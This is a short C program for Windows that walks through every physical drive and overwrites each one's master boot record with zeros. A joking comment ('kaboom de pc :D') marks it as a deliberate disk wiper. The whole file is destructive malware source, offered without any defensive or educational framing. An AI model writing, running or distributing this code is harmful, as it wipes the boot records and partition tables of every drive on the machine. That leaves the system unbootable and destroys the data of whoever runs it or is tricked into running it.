#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define MBR_SIZE 512 // size of the mbr, so where to find it in the PhysicalDrive

// function to write zeroes to the MBR of the given drive
void write_zero_mbr(const char *device) {
    unsigned char buffer[MBR_SIZE] = {0};  // initialize buffer with 0s

    HANDLE hDevice = CreateFileA(device, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        perror("failed to open disk");
        return;
    }

    WriteFile(hDevice, buffer, MBR_SIZE, NULL, NULL);  // write the zero buffer to the disk
    CloseHandle(hDevice);

    printf("wrote zeroes to mbr of %s\n", device);
}

// function to detect all physical drives and write zeroes to their MBR
void detect_windows_drives() {
    for (int i = 0; ; i++) {
        char device[16];
        snprintf(device, sizeof(device), "\\\\.\\PhysicalDrive%d", i);

        // Try to open the device
        HANDLE hDevice = CreateFileA(device, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hDevice == INVALID_HANDLE_VALUE) {
            break;  // no more physical drives
        }

        CloseHandle(hDevice);
        write_zero_mbr(device);  // write to the drive
    }
}

int main() {
    detect_windows_drives();  // kaboom de pc :D
    return 0;
}
